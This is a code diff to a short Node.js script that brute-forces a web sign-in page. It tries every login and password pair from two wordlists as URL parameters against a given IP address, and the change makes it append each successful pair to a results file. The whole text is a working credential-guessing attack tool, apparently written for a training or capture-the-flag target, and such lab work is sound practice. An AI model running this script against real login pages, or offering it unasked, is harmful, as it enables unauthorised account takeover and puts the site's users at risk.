@@ -1,7 +1,8 @@
-import { readFile } from 'node:fs/promises';
+import { readFile, appendFile } from 'node:fs/promises';
 
 const loginsFile = 'logins';
 const passwordsFile = 'passwords';
+const resultFile = 'result';
 
 const  getUrl = (ip, login, password) => `http://${ip}/?page=signin&username=${login}&password=${password}&Login=Login#`;
 
@@ -27,17 +28,19 @@ const testSuccess = async (url) => {
 }
 
 async function bruteForce(logins, passwords, ip) {    
-    let successResults = [];
+    // let successResults = [];
 
     for (let login = 0; login < logins.length; login++) {
         for (let pass = 0; pass < passwords.length; pass++) {
             const isSuccess = await testSuccess(getUrl(ip, logins[login], passwords[pass]));
             if (isSuccess) {
-                successResults.push({login:logins[login], password: passwords[pass] }) 
+                const line =`{login: ${logins[login]}, password: ${passwords[pass]} }` + '\n';
+                await appendFile(resultFile, line, 'utf8');
+                // successResults.push() 
             }
         }
     }
-    return successResults;
+    // return successResults;
 }
 
 async function main() {
@@ -50,7 +53,7 @@ async function main() {
         console.log('error: no test data')
         return;
     }
-    return await bruteForce(logins, passwords, ip);
+    await bruteForce(logins, passwords, ip);
 }
 
-console.log(await main());
+await main();
